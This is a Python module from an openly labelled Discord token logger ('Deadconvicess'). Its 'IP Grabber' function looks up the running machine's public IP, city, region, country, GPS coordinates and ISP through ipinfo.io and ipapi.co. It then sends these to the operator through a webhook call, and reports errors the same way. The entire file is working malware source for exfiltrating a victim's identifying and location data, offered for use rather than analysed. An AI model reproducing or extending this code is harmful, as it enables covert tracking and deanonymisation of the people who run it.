# Token Logger - Deadconvicess
# Github - https://github.com/deadconvicess/Discord-Token-Logger


# IP Grabber
import requests
import time
def ip():
    def ip():
        try:
            response = requests.get("https://ipinfo.io/json", timeout=5)
            response.raise_for_status()
            return response.json()
        except requests.RequestException:
            return None
    def fb():
        try:
            response = requests.get("https://ipapi.co/json/", timeout=5)
            response.raise_for_status()
            data = response.json()
            return {
                "ip": data.get("ip"),
                "city": data.get("city"),
                "region": data.get("region"),
                "country": data.get("country_name"),
                "loc": f"{data.get('latitude')},{data.get('longitude')}",
                "org": data.get("org")
            }
        except requests.RequestException:
            return None
    def menu(info):
        message = (
            f"🔹 IP: `{info.get('ip')}`\n"
            f"🌐 Location: {info.get('city')}, {info.get('region')}, {info.get('country')}\n"
            f"📍 Coords: `{info.get('loc')}`\n"
            f"🏢 ISP: {info.get('org')}"
        )
        send_webhook(message, title="Ip Grabber", encrypt=False)
    try:
        data = ip()
        if not data:
            time.sleep(1)
            data = ip()
        if data:
            menu(data)
        else:
            send_webhook("Failed", title="IP Error", encrypt=False)
    except Exception as e:
        send_webhook(f"error in `ip()`:\n`{str(e)}`", title="Error", encrypt=False)